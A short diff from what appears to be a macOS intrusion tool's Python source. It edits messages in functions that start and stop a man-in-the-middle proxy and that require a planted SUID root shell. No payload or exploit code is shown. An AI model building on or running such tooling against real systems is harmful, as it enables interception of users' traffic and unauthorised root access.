@@ -1009,7 +1009,7 @@ def mike_helper(payload_path):
 
 def mitm_kill(interface, certsha1):
 	if not is_there_SUID_shell():
-		return "%sYou must have a root shell to stop MITM. See rooter.\n" % red_minus
+		return "%sYou must have a root shell to stop MITM. See get_root.\n" % red_minus
 
 	x = check_output("networksetup -getsecurewebproxy %s" % interface)
 	if not x[0]:
@@ -1054,7 +1054,8 @@ def mitm_kill(interface, certsha1):
 
 def mitm_start(interface, cert):
 	if not is_there_SUID_shell():
-		return "%sYou must have a root shell to start MITM. See rooter.\n" % red_minus
+		send_msg("%sYou must have a root shell to start MITM. See get_root.\n" % red_minus, True)
+		return
 
 	x = check_output("networksetup -getsecurewebproxy %s" % interface)
 	if not x[0]:
